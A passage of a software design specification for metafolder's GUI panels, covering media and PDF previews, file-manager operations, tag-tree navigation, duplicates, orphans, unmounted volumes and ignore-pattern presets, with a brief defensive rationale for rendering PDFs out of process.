| =file:zoom out=   | =-=         | Shrink by one step                                  |
| =file:zoom fit=   | ~=~         | Fit the available space (aspect preserved) — default |
| =file:zoom reset= | =0=         | Original (1:1) size                                 |

The step and the bounds of a manual zoom are configurable
(=[panel-defaults.file].zoom-step= / =zoom-min= / =zoom-max=, defaults 1.25 /
0.05 / 40 — see [[*Panel defaults]]).

"Fit" fills the viewer, scaling to whichever of full width or full height comes
first without distortion. A manual zoom (=+= / =-= / =0=) sizes the media in
pixels relative to its natural dimensions, with the viewer scrolling when the
result overflows; the first =+= / =-= continues smoothly from whatever "fit" is
currently showing. The chosen zoom state persists while browsing other files.
The "+" key is spelled =plus= in keybindings TOML (a literal =+= is the chord
separator).

Default keybindings map the arrow keys, when the =file= panel is focused,
to =metarecord-list:next= / =metarecord-list:prev=: they move the metarecord-list
selection of the same workspace (commands dispatch to their owning panel
type), and the preview follows through =selected_paths= — flipping through
files without leaving the preview. Pure keybindings, no coupling in
either panel; rebindable like everything else.

**** Video playback position

A video resumes where it was last stopped. The position (in seconds) is stored
on the *metarecord of the played file* as an ordinary user field,
=playback_position= (=float=) — not an =mfr_*= one: it is user data, not a
filesystem fact, and a reserved name would need =force=. Nothing is stored for
an untracked file (no metarecord to hold it), nor for a file reached by
drilling into a directory listing, where the panel holds a path but no
metarecord: the position follows =selected_metarecord=, which every panel
publishing =selected_paths= sets alongside them.

When the player is loaded, a stored position is seeked to and shown in the
media toolbar
(=↩ 12:34=). It is read *before the media element is created*, and the seek is
armed before the element is given its source: the seek then happens the moment
the duration is known, so the opening frame of the file is never shown. (Doing
it afterwards left a daemon round trip during which the browser had already
painted frame 0, only for the answer to jump it elsewhere — a visible flicker
on every resumed video.) It is written back on pause, seek and end, when the preview is
torn down (another file selected, panel or workspace closed), and periodically
while the video plays — which bounds what an abruptly killed window can lose.
Never on =timeupdate=: it fires several times a second, and *every write is an
event-log revision*.

Two positions are not worth resuming, and *clear* the stored one rather than
overwrite it: the very beginning (under 5 s — nothing was watched) and the end
(under 10 s left — the video was watched through, so the next open starts from
scratch). That end margin is absolute, not a percentage: 5 % of a three-hour
film is nine minutes, which is not "the end". A stored position past the end of
the file (it changed underneath) is ignored, and when the duration is unknown
nothing is written at all — a position that could never be recognized as stale
is worse than none.

**** Media transport

The previewed audio/video is driven from the keyboard as a media player is,
on mpv's keys so the muscle memory carries over — play/pause (=space=), seek
±10 s (=left= / =right=) and ±60 s (=shift+left= / =shift+right=), playback
rate up/down a fixed ladder (=]= / =[=, =backspace= to return to 1×), volume
±10 % (=shift+up= / =shift+down=), mute (=ctrl+m=, since a bare =m= opens
the metarecord-edit key sequence) and back to the start (=r=: the key that
refreshes a list panel means "play it again" where there is no list to
re-read). Each has a command (=file:play-pause=, =file:seek-*=, =file:restart=,
=file:speed-*=, =file:volume-*=, =file:mute=), so all of them are rebindable
and reachable from the command input.

Every one of them is a *no-op when the preview holds no media* — an image, a
text file, a directory listing — so binding them inside the =file= panel is
harmless. The exception is =file:play-pause= in front of a media poster, where
there is no element *yet*: it is then the gesture that loads the player and
starts it. Seeks are clamped to the media (never before its start nor past its
end), the rate walks a fixed ladder rather than scaling freely, and raising the
volume also unmutes (the natural way to undo a mute).

*Volume and mute are panel state, not the element's* (=file:volume-*= /
=file:mute= are therefore the one other exception to the no-op rule). The
element exists only while something plays, so a level held on it could only be
set *after* the first sound had already come out at whatever the last file
left behind — and a video that starts at full blast has made the noise before
anyone can turn it down. Held by the panel, the level is settable in front of
the poster, is applied to each element before its source (so it holds from the
first sample), and persists while browsing other files, exactly like the zoom
state. While the poster is showing — the only moment with nothing to read it
off — it is written into the poster's hint line ("volume 40 %", "muted"),
which says nothing at a plain unmuted 100 %.

**** Documents

A document — a PDF — is previewed **one page at a time, as an image the GUI
server rendered**. The panel asks =GET /document/info?path== for the page
count, then shows =GET /document?path=&page=N&dpi=D= in an ordinary =<img>=,
which makes the whole zoom machinery above apply to a page unchanged. Turning a
page swaps that image's =src= rather than rebuilding the view, so the zoom the
user set survives it.

| Command            | Default key | Effect                |
|--------------------+-------------+-----------------------|
| =file:page next=   | =pagedown=  | Next page             |
| =file:page prev=   | =pageup=    | Previous page         |
| =file:page first=  | —           | First page            |
| =file:page last=   | —           | Last page             |

Each is a no-op unless a document is previewed, like the zoom and transport
commands. =home= / =end= are deliberately *not* bound to first/last page: in
this panel they already jump the metarecord-list to its first/last row (like
the arrow keys), and flipping through the files of a folder is the more
frequent gesture. Which extensions take this route, and at what resolution,
are =[panel-defaults.file].document-extensions= / =document-dpi= (defaults
=["pdf"]= / 150 — see [[*Panel defaults]]); the zoom works on the rendered
image, so the DPI is the *rendering* detail, not the displayed size.

*The file's own bytes never reach the WebView*, and that is the whole reason
for the endpoint. WebKitGTK ships a built-in PDF.js viewer, so an
=<iframe src="/fsraw?path=…pdf">= would display the document with no work at
all — and would also be a full compromise: =/fsraw= carries the session token
in its URL (an =<img>= =src= cannot set a header), so a crafted PDF loaded *as
a document* runs as code in the GUI server's origin, can read
=location.search=, and can drive the whole =/gui/*= scripting API including
=POST /gui/command= and its =!= shell commands. That is the invariant stated in
=server/fsraw.rs= and enforced by =tests/panel_invariants.rs= (no shipped panel
may contain =iframe=, =<object=, =<embed=, =window.open=, =location.href=…),
and the WebView's CSP says the same with =object-src 'none'= / =frame-src
'none'=. Rendering out of process keeps the PDF parser — a large C++ library
facing untrusted input — inside =bwrap= + rlimits, exactly like the =ffmpeg=
poster extraction (see [[*Untrusted media]]), and hands the web process nothing
but a PNG.

Rendering is done by *poppler* (=pdftoppm= for the pages, =pdfinfo= for the
count), an optional runtime dependency: without it a document shows "no preview
available for this format" and its grid tile falls back to the 📕 glyph. The
page PNGs are cached in =<repo>/.metafolder/internal/documents/=, keyed by the
source's path/mtime/size *and* the rendering (page number, DPI), so an edited
document is never served a stale page. Writing that cache is why =GET /document=
needs the file's repository and answers 404 for a file inside none — the same
rule as =/thumbnail=; =GET /document/info= writes nothing and answers for any
readable file.

A document's *grid tile* is its first page, through the same =GET /thumbnail=
endpoint as a video poster (=thumbnails::is_posterable= accepts it, and
dispatches to poppler instead of ffmpeg), so a folder of PDFs shows its covers
rather than a wall of identical 📕.

*** =file-manager= panel type

A filesystem tree navigator. The GUI backend (Tauri/Rust) reads the disk
directly; the daemon is not involved in directory listing.

*Display*: a tree/list of files and directories, each row prefixed with a
type icon (📁 for a directory, otherwise =fileTypeGlyph= — 🎬 video, 🎵 music,
📕 PDF…), with a visual distinction
between tracked metarecords (have =mfr_path= metadata in the active repo) and
untracked ones. When =active_repo= is =null=, all metarecords are shown as
untracked (no distinction is possible). The listing starts with two
synthetic rows, =.= (the displayed directory itself) and =..= (its parent),
as in a Unix directory listing; this makes the directory's own metarecord —
including the repo root — selectable. The tracked distinction is resolved
per displayed directory (the direct children plus the =.= / =..= rows),
never by scanning the whole repository.

Hidden files (dot-entries) are not listed by default; a *hidden files*
checkbox in the toolbar (unchecked by default, mirrored by the
=file-manager:toggle hidden= command) reveals them. The synthetic =.= / =..=
rows are always shown, and navigating directly into a hidden directory
(e.g. via a seeded start path) still works.

The active repo's =.metafolder/internal/= directory and its contents are
shown in red (=--mf-error=) with an =internal= badge: they are hard-excluded
from tracking (see [[file:spec-file-tracking.org][spec-file-tracking.org]]),
so the add-to-DB actions are disabled on them. The path comes from the
=internal_dir= field of =GET /repos= (=metafolder.daemon.repoInternalDir=) —
it is matched absolutely, not by name, since the metafolder may live
anywhere.

*Root behaviour*: a checkbox (default: checked) constrains navigation to the
=active_repo= root. When unchecked, the user can navigate anywhere on the
disk. Adding files to the DB is only available for paths inside the
=active_repo= root; attempting it outside returns an error in the status bar.
When =active_repo= is =null=, the checkbox is disabled and =file-manager:track=
returns an error.

The toolbar's root button (and =file-manager:root=, default =/=) jumps to
the =active_repo= root — but with no repository there is no repo root to jump
to, and the panel is then a plain disk browser: the button reads *root* instead
of *repo root* and goes to the filesystem root (=/=). It is never a dead end,
and never an error.

*Selection*: moving the cursor sets =workspace.selected_paths= to a
single-element list containing the highlighted path. If the path has an
existing metadata metarecord in the active repo, =workspace.selected_metarecord= is also
updated; otherwise it is set to =null=.

*Reveal*: the panel also honours a =file-manager:reveal-path= workspace variable
(={ path, nonce }=), set by =file-manager:reveal= from another panel — it
stats the path, navigates to the folder (its parent for a file, highlighting the
file), and drops the root constraint if the target lies outside the repo. See
[[*Cross-panel selection]].

*Keyboard*: =Up= / =Down= navigate; =Enter= expands a directory or confirms
selection for a file; =Backspace= goes up one level; =/= jumps to the root and
=Ctrl+H= shows/hides the dot-entries; =r= refreshes;
=Delete= deletes the highlighted entry; =F2= renames; =Ctrl+C= / =Ctrl+X= /
=Ctrl+V= copy / cut / paste; =Ctrl+D= duplicates; =Ctrl+Shift+N= creates a
folder.

*Listing*: the directory's entries are rendered in windows (page size from
=[page-size].file-manager= in =config.toml=, default 200 — the largest of the
list panels, since a plain text row is the cheapest to build — with more
revealed on scroll), so a directory with many thousands of files stays
responsive; a footer shows =shown/total entries= (mirroring the
=metarecord-list= count). The tracked status of the rows is queried *per
rendered window* (a =Follows(parent) AND Matches(^(name…)$)= query over just
that window's names), not for every child up front, so the per-entry daemon
lookups are bounded to what is on screen. =file-manager:refresh= re-reads the
current directory and its tracked status, preserving the cursor.

*File operations*: the panel edits the disk directly (via [[*=metafolder.fs=][=metafolder.fs=]], never
the daemon — the same way it reads it), so it can stand in for a general
file browser: create a folder or an empty file, copy/cut/paste, rename,
duplicate and delete. This is deliberately *disk-only*: a tracked
metarecord whose file is renamed/moved/deleted here goes stale until the
watcher (=mf_watch = true= subtrees) or a reconcile catches up — matching the
panel's read-side, which never involves the daemon in filesystem I/O. The
backend refuses to overwrite an existing destination, so a name clash is a
clear error, never a silent clobber. New/duplicated/pasted names that would
collide are de-duplicated with a " copy" suffix ("=foo copy.txt=",
"=foo copy 2.txt="…). The clipboard (copy/cut) is a single store shared by
*every* file-manager panel in the GUI, like a desktop file manager: cut in one,
paste in another (even a different workspace); a cut is cleared once pasted.
Pasting a directory into itself or a descendant is refused. *Delete* is
restorable when a repository is active — the entry (tracked or not) is sent to
the repo trash ([[file:spec-trash.org][spec-trash.org]]) as a manual entry, restorable from the trash
panel; browsing the raw disk with no active repo, it is a permanent removal.
Both are confirmed.

*Context menu*: right-clicking a row moves the cursor there and opens an
HTML menu ([[*Context menus]]): =Open= (directories), =Track= (disabled when
there is no active repo, the path is already tracked, or it is outside the
repo root), then the clipboard actions (=Cut=, =Copy=, =Paste=), =Rename…=,
=Duplicate=, =Copy full path=, the delete action (=Move to trash= with a repo,
else =Delete…=),
and the directory-level =New folder…= / =New file…=. Right-clicking empty
space in the listing offers just =New folder…= / =New file…= / =Paste=.

| Command                   | Description                                              |
|---------------------------+----------------------------------------------------------|
| =file-manager:track=        | Add the selected path to the DB via =POST .../track= (creates metarecord with =mf_watch = false=; parent metarecords created automatically). Error if already tracked (=409=) or outside =active_repo= root. |
| =file-manager:root=  | Jump to the root directory: the =active_repo= root, or =/= when no repository is active (=/=) |
| =file-manager:refresh=    | Reload the current directory (and tracked status), keeping the cursor |
| =file-manager:toggle root= | Toggle the "constrain to root" checkbox                 |
| =file-manager:toggle hidden= | Show/hide the dot-entries (=ctrl+h=)                  |
| =file-manager:new folder= | Create a new folder in the current directory (name prompted) |
| =file-manager:new file=   | Create a new empty file in the current directory (name prompted) |
| =file-manager:rename=     | Rename the selected entry (=F2=; name pre-filled)        |
| =file-manager:duplicate=  | Copy the selected entry beside itself under a " copy" name (=Ctrl+D=) |
| =file-manager:copy=       | Copy the selected entry to the shared clipboard (=Ctrl+C=) |
| =file-manager:cut=        | Cut the selected entry to the shared clipboard (=Ctrl+X=) |
| =file-manager:paste=      | Paste the clipboard into the current directory (=Ctrl+V=; copy or move) |
| =file-manager:delete=     | Delete the selected entry (=Delete=): to the repo trash when a repo is active, else permanently; confirmed. A *tracked* entry has its metarecords captured and deleted like any other trashing (spec-trash "What trashing does, in order") — the GUI is the path most deletions take, and must not be the one that still leaves orphans |
| =file-manager:find=       | Move the cursor onto an entry of the current directory (=f=), its name collected in the command input — the shared list-panel find, see [[*Find an entry]]. Only the displayed directory is searched (hidden entries only when they are shown), and a directory is selected, not entered. |

*** =treeref= panel type

A navigator for a *TreeRef forest*, the way =file-manager= navigates the disk
— but over any TreeRef field (=mfr_path=, or a user tag tree), driven entirely
by the daemon. The primary use is observing a tag hierarchy.

*Field picker*: a dropdown of the repo's TreeRef field names
(=GET /repos/:repo/fields?type=tree_ref=, [[file:spec-data-model.org][spec-data-model.org]]); =mfr_path= is the
default, configurable as =[panel-defaults.treeref].field= (see
[[*Panel defaults]]) and overridden by a stored =treeref:field=. Changing the field resets navigation to the roots. =treeref:set field=
(=Shift+F=) is its keyboard equivalent: it asks for the field name in the command
input, completing over the same list, and mirrors the pick back into the
dropdown. The minibuffer starts *empty* — the answer names another forest, not
an edit of the current one, so a pre-fill would only have to be erased first
(the dropdown already shows which field is current).

*Navigation*: by *parent UUID*, not by path string, so a name containing =/=
is handled correctly. The view *starts at the forest roots*, fetched from
=GET /repos/:repo/tree/roots?field=<field>= ([[file:spec-data-model.org][spec-data-model.org]]) — the roots' parent
is the root sentinel, which =Follows= cannot address (the empty path resolves
to the sentinel's *children*, and only when a root is literally named =""=, as
=mfr_path='s repo-root metarecord is). A node =U='s direct children are then
fetched with =Follows{field, target: \{uuid_in: [U]\}\}=, each row showing the
single name component it contributes (read directly from its =tree_ref= value —
no =resolve-tree= round-trip). The empty-named =mfr_path= root displays as =/=.
A breadcrumb shows the current path; clicking a crumb jumps there.
Branch-vs-leaf is *not* predicted up front: descending into a leaf simply shows
an empty list. Children are fetched page by page (=[page-size].treeref=,
default 200) with more on scroll; the (few) roots are fetched in one call.

*Selection*: highlighting a node sets =selected_metarecord= (=\{uuid, repo\}=,
so =metarecord-detail= follows) and =selected_treeref=
(=\{repo, field, uuid, path\}=).

*Keyboard*: =Up=/=Down= (or =j=/=k=) move; =Enter=/=Right= descend;
=Backspace=/=Left= go up; =/= jumps back to the forest roots (as it jumps to the
root in the file manager); =r= refreshes; =f= jumps to a child by name (see
[[*Find an entry]]), =Shift+F= picks the explored field; =l= lists what points at
the node, =s= toggles the scope, =e= picks the Ref field.

*Ref bar — "what points at this node?"*. The companion question a tree
inevitably raises ("what is tagged with this?") is answered by *building a
query*, not by a second panel type. A second toolbar row carries a *Ref field*
picker (=GET /repos/:repo/fields?type=ref=; default =tag=, the common case,
configurable as =[panel-defaults.treeref].ref-field= and overridden by a stored
=treeref:ref-field=), a *scope* selector (=exact= / =+ descendants=, stored as
=treeref:scope=), and a read-only preview of the DSL those two produce for the
node under the cursor — so the bar says what the command will *do*, not merely
which field it reads:

- =exact= — =\<ref\> -> (\<tree\> = "<path>")=: the node itself. On a TreeRef
  field =\=​= is the exact node at that path ([[file:spec-query.org][spec-query.org]]
  "Field aspects"), so this pins one node at every depth, a forest root included.
- =+ descendants= — =\<ref\> -> (\<tree\> =>* "<path>")=: the node *and* every
  descendant — classic tag inheritance, where selecting =music= also surfaces
  things tagged =music/rock=.

=treeref:list-refs= (=l=, and the right-click item /List what <ref> points at
here/) publishes that DSL as =metarecord-list:query-request= and opens
=metarecord-list= *in the other slot*, so the tree stays visible and the next
node can be asked about straight away. The query lands in the list's normal-DSL
zone, *shown and frozen*: it is a starting point, editable and composable, not a
mode — which is the reason a dedicated panel type is not needed for it.

| Command            | Description                                  |
|--------------------+----------------------------------------------|
| =treeref:descend=  | Descend into the selected node               |
| =treeref:parent=   | Go up one level                              |
| =treeref:root=     | Jump to the forest roots                     |
| =treeref:refresh=  | Reload the field lists and current children  |
| =treeref:set field= | Explore another TreeRef field (arg: field name, no pre-fill) |
| =treeref:find=     | Jump to a loaded child by name (=f=; see [[*Find an entry]]) |
| =treeref:list-refs= | List the metarecords whose Ref field points at the selected node |
| =treeref:toggle scope= | Toggle between =exact= and =+ descendants= |
| =treeref:set ref-field= | Choose the Ref field to follow back (arg: field name) |

*** =workspace-info= panel type

Displays all workspace variables for the current workspace: =active_repo=,
=selected_paths=, =selected_metarecord=, =selected_metarecords=, and any custom
namespaced variables. Values are shown in JSON format and update reactively
as they change. Read-only; useful for debugging panel type communication and
for monitoring GUI state from scripts.

*** Cross-panel selection

Selecting a metarecord in =metarecord-list= or =file-manager= updates the workspace
variables =selected_paths= and/or =selected_metarecord= (see the respective panel
type sections for details). Any slot in the same workspace displaying
=metarecord-detail=, =file=, or =workspace-info= subscribes reactively and updates
automatically. Slots showing different workspaces are unaffected.

*Double-click* (or =Enter= / =Right= keybinding) in =metarecord-list=: if the
other slot shows the same workspace and is displaying a different panel type,
it is switched to =metarecord-detail= (or =file= if the metarecord has a valid
=mfr_path=). If the other slot is hidden, it is opened (showing the same
workspace).

*Edit guard*: before =metarecord-detail= replaces its content with a new metarecord, it
checks whether any field is being edited. If so, an alert is shown:
="Unsaved changes — discard and switch metarecord? [Confirm / Cancel]"=. The switch
proceeds only if the user confirms.

*Reveal folder*: the builtin command =file-manager:reveal= (and the
right-click menu item "Open folder in file manager" in =metarecord-list= and
=metarecord-detail=) opens the selected metarecord's folder in the file manager,
*replacing the focused panel* — the folder itself when the metarecord is a
directory, or the folder containing the file (with the file highlighted) when it
is a file. It reads the selection's first =selected_paths= entry, publishes it as
the workspace variable =file-manager:reveal-path= (={ path, nonce }=), then
switches the focused slot to =file-manager=; the =file-manager= panel stats the
path to tell a directory from a file and navigates there (honouring the request
both when it mounts and while already mounted, the =nonce= guaranteeing an
identical repeated request re-triggers while the same request acts only once).

*List folder*: the builtin command =metarecord-list:folder= (and the
right-click menu item "Open folder in metarecord-list", offered by every panel
showing metarecords — the file manager included, where "and now show me these as
metarecords" is exactly the question) is the mirror image: it shows the same
folder's *metarecords* instead of its disk entries, *replacing the focused
panel*. The folder is resolved selection-first — the selected metarecord's own
directory (itself when =mfr_type= is =dir=, its parent otherwise, via
=resolve-tree=), else the selected path's (statted, since an untracked row has no
metarecord to ask), else the file manager's current directory, else the
repository root. A selection outside the repository is refused with a status
message rather than silently answering for the root. Note the opposite priority
from the =ignore:*= commands' target directory, where the file manager's
directory is the subject and the selection only a fallback: here the clicked row
is the subject. The folder becomes the DSL =mfr_path -> "<folder>"= (=Follows=:
the metarecords whose =mfr_path= parent is that node — its files *and* its
subdirectories, the contents a file manager shows), published as the workspace
variable =metarecord-list:query-request= (={ dsl, nonce }=) before the focused
slot switches to =metarecord-list=. Repository-relative paths follow the
=mfr_path= convention throughout: =""= is the repository root, a descendant is
leading-"/"-rooted.

** Message view

The =message= panel type is a scrollable, append-only log, *per-workspace*,
shown *newest first* (anti-chronological): a new entry is prepended, so the
latest output is always at the top with no scrolling. The view follows the
newest entry only while the reader is already at the top — someone who
scrolled down into the history keeps their position.
It receives:
- All messages posted to the active workspace's status bar (with timestamp).
- Every command invocation dispatched in this workspace, echoed as
  =​> name args= before the command runs — unless the command opted out of
  logging at registration (see "Command", the =log= flag). Basic editing
  primitives (=editing:*=, =command-input:focus command=) opt out to avoid noise.
- stdout/stderr of shell commands run via =!= in this workspace (echoed as
  =$ command=).
- Reconcile progress and results triggered from this workspace.
- Any message posted by a script via =POST /gui/message= targeting this
  workspace (also shown in the status bar as a transient notification).

The log is cleared by the =message:clear= command. It is not persisted across
sessions.

** Opening a file with another program

Everything the GUI cannot show itself is handed to an external program.
=file:open-with= (default =g w=, and *Open with…* in the right-click menu of
any file row) asks for the program in the command input and runs it on the
current selection.

- *Target*: =selected_paths= — so it works from whichever panel carries the
  selection (list, detail, file, file-manager, recent, treeref). The
  menu item publishes the right-clicked row as the selection first, exactly
  like the reveal commands do. With nothing selected it reports "no file or
  folder is selected" and does nothing.
- *Program*: the argument completes over the top-level =open-with= array of the
  GUI =config.toml= (default =["xdg-open"]=, the desktop's own handler). Those
  are *candidates, not a whitelist*: any command line may be typed, and the
  whole line is inserted verbatim so flags survive (=gimp -n=). Only the paths
  are shell-quoted, and they are appended after the line.
- *Execution*: the same subprocess path as a =!= command (output in the
  =message= panel, a spinner in the [[*Task bar]]) — but the focused slot is
  *not* switched to the =message= panel: launching a viewer must not disturb
  what is on screen.

** Reconcile

=reconcile:run= calls =POST .../reconcile= (asynchronous — 202 + task id, see
[[file:spec-tasks.org][spec-tasks.org]]) and polls the task only to know when it
finishes; live progress is shown by the [[*Task bar]], not the status bar. On
completion:
- Status bar: ="Reconcile: N created, M updated, P unchanged."=
- Full output (per-file actions and candidate stale matches) is appended to the
  =message= panel type.

** Duplicates

=mf:duplicate scan= is the GUI half of =mf duplicate scan= (see
[[file:spec-duplicates.org][spec-duplicates.org]]): it calls
=POST .../duplicates/scan= (202 + task id) and, like =reconcile:run=, polls the
task only to know when it ends — live progress belongs to the [[*Task bar]].
Its options (=--min-size=, =--rehash=, a subtree) stay *CLI-only*, the way
=mf trash prune='s selectors do: the command runs the ordinary
whole-repository scan, which is what a bare invocation should mean. On
completion the status bar shows
="Duplicates: N groups, M files, 4.5G reclaimable."= and the full summary goes
to the =message= panel. A *cancelled* scan is reported as an outcome rather than
an error — the hashes and groups it wrote are kept.

The =full= phase reports *bytes* rather than files (see
[[file:spec-tasks.org][spec-tasks.org]] "Duplicate scan progress phases"), so the
task bar formats this phase's counts as a size.

The *duplicates panel* (=panel:set type duplicates=, suggested default =t u=)
lists the groups — reclaimable space, size, member count, hash — worst first,
each expanding to its members' paths with a marker on those sharing an inode
with another member. It is an ordinary query view over
=mf_schema = "duplicate_group"= sorted on =mfr_duplicate_reclaimable=. Every
row is a metarecord selection — a member, or the group metarecord on a header
row — so =metarecord:trash= and the shared file actions apply as they do
anywhere else, and the detail panel can show a group's own fields.

Deleting duplicates is what one opens this panel for, so it owns two actions of
its own, detailed in [[file:spec-duplicates.org][spec-duplicates.org]] "GUI":
=duplicates:keep= (=shift+k=) trashes every copy of the group *except* the row
under the cursor, and =duplicates:trash= (=Delete=) trashes that row alone. Both
confirm first, both name what they touch, and both re-count the group they
emptied (dropping it when one copy is left) as the daemon does. Nothing deletes
a file implicitly and nothing picks a survivor for you — the surviving copy is
always the row the cursor is on.

=metarecord-list:query duplicates= works from the other direction: it sets the
panel's DSL query to =same(mfr_duplicate_group, <selected uuid>)=
([[file:spec-query.org][spec-query.org]] "Same-value matching"), which is how a
file's twins are reached without the caller ever handling a hash. It writes the
query into the *visible* DSL zone rather than overriding it invisibly, so the
result composes with everything else the box can express — =AND NOT <uuid>= for "the
others", an extra predicate to narrow it.

** Order a folder's children

=mf:order= is the GUI half of =mf order= (see
[[file:spec-file-tracking.org][spec-file-tracking.org]] "=mf order="): it numbers
the *direct children* of one folder so a "sort by position" orders them sensibly
— files into =order_file=, directories into =order_dir=, an
existing position never overwritten — and then marks the folder itself with
=order_numbered = true=.

The heuristic and the daemon orchestration are the CLI's, shared in
=metafolder_core::order=; the shell only collects *which* folder, as an
[[*Interactive command arguments (command mode)]] argument:

- prompt ="Number the children of:"=, pre-filled with the same target directory
  the =ignore:*= commands use (the file manager's current directory, else the
  selected metarecord's directory, else the repository root);
- completion = every tracked directory of the active repository, the root shown
  as =/=; a hand-typed path is accepted too (a missing leading =/= is added, a
  trailing one dropped).

The folder is resolved to its metarecord through =POST .../tree/resolve-path=;
an untracked path is a status-bar error, never a silent no-op. On success the
status bar reports the path and the number of positions written (or that every
child already had one). Unlike the CLI there is no dry run: the message names
what changed, and the write is one revision, undoable with =log:undo=.

** Unmounted volumes

A repository can contain the mount point of a removable or network volume
(spec-file-tracking "Mount points"). While the volume is not mounted, its
metarecords are still in the database, still queryable, and still shown by every
list — but the files behind them are *unavailable*, not deleted. The GUI's job
is to make that distinction visible, because the two look identical otherwise:
an orphan (=mfr_path = Nothing=) is a file that is gone for good, an unavailable
record is one that comes back when the drive is plugged in.

*Source of truth*: =GET /repos/:repo/mounts= (spec-file-tracking "Mount
status"), fetched by the panels through =metafolder.daemon= and re-read whenever
a panel reloads what it shows (a new directory listing, a new query, a repo
switch) — the call is cheap, and a volume can be plugged in or pulled out
between two of them. A daemon that cannot answer (an older one, one that is
down) degrades to "no mount points": the display loses a distinction, it never
blocks. A path is *unavailable* when it is at or below a mount point whose state
is =offline=.

*Presentation* — one shared vocabulary across panels, distinct from the orphan
one: the =--mf-warning= amber (never the =--mf-error= red of
=.metafolder/internal/=, never the =--mf-orphan= purple), and one sentence that
names what to plug back in — ="volume not mounted: label:PHOTOS
(/media/photos)"=, built from the mount point's path and its =expected=
identity.

*Per panel*:
- =metarecord-detail= — an amber line above the field list when *every* path of
  the displayed record is behind an offline mount point. It is checked *before*
  the orphan line and replaces it: a stale path on an unplugged drive is not an
  orphan, and saying so would invite the user to clean up records they want
  kept.
- =file= — no preview is attempted: the panel shows that sentence where "no
  preview available" would go, so the user is not left guessing why a file the
  database knows about will not open.
- =file-manager= — a banner above the listing when the displayed directory is
  itself at or below an offline mount point, and an =⏏ not mounted= badge (amber
  name, the sentence as tooltip) on any listed entry that is.
- =metarecord-list= — unavailable rows are amber with the sentence as their
  tooltip; no filtering is applied, since browsing that metadata with the drive
  unplugged is the point.

Nothing in the GUI ever offers to "clean up" unavailable records: =mf orphan= is
the only path to writing =Nothing=, and it refuses these by design. =orphan:detect=
inherits the same guard — a record at or below an offline mount point is never
marked, so =orphan:delete= cannot reach one. Nor is a
reconcile offered from the banner: while the volume is away the daemon rejects
one, and once it is back the banner is gone — the user runs
=reconcile:run= on the subtree when they want the off-line changes picked up
(spec-file-tracking "Offline subtrees").

** Orphans

An *orphan* is a metarecord whose file is gone: either =mfr_path = Nothing= (the
watcher saw the deletion) or a =mfr_path= that still resolves to a path the disk
no longer has (a subtree deleted while unwatched — reconcile leaves those in
place). The second kind is invisible to a query, which sees the database and
never the disk, so finding them takes a scan.

The GUI does not hold that scan's answer in a panel. =orphan:detect= asks the
daemon to *write* it, as an ordinary field — =orphan = true= — and everything
downstream is then a plain query (spec-file-tracking "Marking orphans"):

- =orphan:detect= — =POST /orphans/mark=. Reports =N orphaned metarecords marked
  orphan = true (A new, B no longer orphaned)= in the status bar and the message
  log, and nudges the panels (=metarecords:dirty=). It writes the marker and
  nothing else: =mfr_path= is left alone, so a detection run is taken back by a
  plain =log:undo=.
- =metarecord-list:query orphans= — the query =orphan = true= in the visible DSL
  zone. No scan, no daemon write: it shows what detection last wrote, which is
  also how a new user finds out what detection *did*.
- =orphan:delete= — deletes the marked metarecords (=POST /query/delete= over the
  same predicate), after a confirmation naming the count. Detection is not
  re-run, so a set the user narrowed by hand (unsetting the marker on records
  they want kept) is respected exactly.
- =orphan:detect-delete= — the two in a row, with the confirmation in between.

Because the marker is an ordinary user field it is editable and queryable like
any other: =orphan = true AND mfr_size > 1000000= narrows it, the detail panel
shows it, and unsetting it by hand takes a record out of the next deletion. It
is also *the last run's answer, not a label*: a record that carries it and whose
file is back is unmarked by the next detection run. That is what makes deleting
the marked set safe.

The row colouring is independent of it and stays as it is: =metarecord-list=
paints a row purple when the record it shows is orphaned (see the concept
above), whether or not a detection has ever run.

** Ignore patterns

The GUI counterpart of =mf ignore= (spec-file-tracking "Ignore presets"). Two
things are exposed: applying *named presets* to a directory, and the ad-hoc
"ignore this, here" gesture from the file manager. Both end up writing the same
thing — the =mf_ignore= rows of one metarecord.

*** Backend commands

Preset expansion is a pure client-side transformation reading a config file
(=core::ignore_presets=), and a panel cannot read files, so the GUI backend
exposes it as Tauri commands (=ignore.rs=, alongside =repo_init.rs=, reusing the
same blocking =DaemonClient=). They add no logic of their own: =core::ignore=
already implements add/remove/set over the daemon API for the CLI.

| Command          | Result                                                             |
|------------------+--------------------------------------------------------------------|
| =ignore_presets= | =[{name, description, patterns}]= — the installed presets, each fully expanded (groups included), sorted by name |
| =ignore_current= | The target metarecord's own =mf_ignore= rows, in order             |
| =ignore_apply=   | Expands the named presets and writes them with =add= / =remove= / =set=; returns the resulting rows |
| =ignore_write=   | Writes an explicit pattern list (ad-hoc patterns, reordering, deletion); an empty list unsets the field |

Nothing else is added: the two introspection endpoints
(=POST …/eligibility=, =GET …/ignore/effective=) are plain daemon calls a panel
makes through =metafolder.daemon=, and a *target* is resolved from a path with
=POST …/tree/resolve-path= (=mfr_path=), the same call the file manager already
uses. Only the presets file justifies a backend command.

A missing or malformed =ignore-presets.toml= is an error naming
=metafolder-sync-config=, never a silent fallback (spec-config).

*** Commands

Four global commands mirror the CLI verbs one-to-one. Each declares its
arguments (see [[*Interactive command arguments (command mode)]]), so invoking
one from the command input prompts for what is missing, with completion:

- =ignore:add <preset>= — append the preset's patterns to the target.
- =ignore:remove <preset>= — remove exactly those patterns from the target.
- =ignore:set <preset>= — replace the target's whole set with them.
- =ignore:list= — show the installed presets and the target's active set in the
  =message= panel (the read-only, non-destructive entry point).

The =preset= argument completes over the installed presets as
="<name> — <description>"= lines, the same shape =script:run= uses; a bare name
typed by hand (or coming from a keybinding) is accepted too.

The *target* is not an argument: it is the current context — the file manager's
current directory when the focused panel is a =file-manager=, else the selected
metarecord when it is a directory, else the repository root. The command's
status message always names the target it resolved (="Ignore: +13 patterns on
/music"=), because applying a preset to the wrong directory is silent otherwise.

*** Inherited sets and copy-on-write

Ignore sets are *replaced, never merged* across ancestors: the nearest ancestor
with at least one row wins. So writing a single pattern onto a directory that has
none silently drops the whole inherited set for that subtree — the one trap of
the feature, and the reason the GUI does more here than the CLI.

Before any write to a target whose set is *inherited* (=ignore_effective= reports
=direct = false= with a non-empty =patterns=), the GUI asks, naming the source
and the count:

#+BEGIN_SRC
/music/live has no ignore patterns of its own; it inherits 13 from /.
  [Copy the 13 inherited patterns here, then apply]   (default)
  [Start from an empty set here]
  [Cancel]
#+END_SRC

Choosing the first writes the inherited rows onto the target *before* the
requested operation, so the visible behaviour is "add one more pattern here"
